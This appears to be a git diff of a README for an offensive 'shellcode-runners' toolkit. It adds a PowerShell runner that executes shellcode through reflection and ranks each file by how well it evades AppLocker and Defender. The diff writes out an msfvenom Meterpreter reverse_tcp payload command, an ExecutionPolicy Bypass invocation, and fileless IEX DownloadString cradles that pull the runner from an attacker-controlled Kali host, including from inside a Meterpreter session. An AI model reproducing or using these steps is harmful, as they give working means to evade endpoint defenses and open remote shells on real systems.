@@ -1,15 +1,16 @@
 # shellcode-runners
 
-Two files. Both are **standalone** — pick one based on your environment. They are not dependent on each other.
+Three files. All **standalone** — pick one based on your environment.
 
 ---
 
 ## File Roles
 
-| File | Standalone? | When to use | Evasion level |
-|------|-------------|-------------|---------------|
-| `simple-runner.cs` | Yes | No restrictions (no AppLocker, Defender off/bypassed) | Low |
-| `clrunner.cs` | Yes | AppLocker blocks your .exe | Medium |
+| File | Output | When to use | Evasion level |
+|------|--------|-------------|---------------|
+| `simple-runner.cs` | .exe | No restrictions (no AppLocker, Defender off/bypassed) | Low |
+| `clrunner.cs` | .exe | AppLocker blocks your .exe | Medium |
+| `ps1-runner.ps1` | .ps1 | No compilation available; CLM not in effect | Low-Medium |
 
 ---
 
@@ -84,8 +85,45 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogTo
 
 ---
 
+---
+
+## ps1-runner.ps1 — Pure PowerShell, No Compilation
+
+No C#, no Visual Studio. Shellcode runs inside `powershell.exe` using WinAPI resolved through
+reflection (`LookupFunc`/`getDelegateType`). No `Add-Type`, no temp files, no `csc.exe`.
+
+**Workflow:**
+```bash
+# 1. Generate shellcode in PowerShell format
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 EXITFUNC=thread -f powershell
+
+# 2. Paste the [Byte[]] $buf = ... line into ps1-runner.ps1 (replace the placeholder)
+
+# 3. No compilation — deliver directly:
+```
+```powershell
+# Option A — run the file
+powershell -ExecutionPolicy Bypass -File .\ps1-runner.ps1
+
+# Option B — fully fileless (serve from Kali, no .ps1 on disk)
+IEX (New-Object Net.WebClient).DownloadString('http://<KALI_IP>/ps1-runner.ps1')
+
+# Option C — from inside an existing Meterpreter session
+meterpreter> load powershell
+meterpreter> powershell_execute "IEX(New-Object Net.WebClient).DownloadString('http://<KALI_IP>/ps1-runner.ps1')"
+```
+
+**Limitations:**
+- Requires PowerShell (not CLM-restricted)
+- Shellcode runs in `powershell.exe` — visible in process list
+- RWX memory allocation is still an EDR flag
+- For injection into another process from PS, use `DLL_Loader.ps1` chain instead (`dll-runners/`)
+
+---
+
 ## Which to choose?
 
 - **No AppLocker, Defender bypassed** → `simple-runner.cs` (simpler, easier to debug)
 - **AppLocker present** → `clrunner.cs`
+- **No compilation available, have PS access** → `ps1-runner.ps1`
 - **Want injection instead of running in your own process** → see `process-injection/`
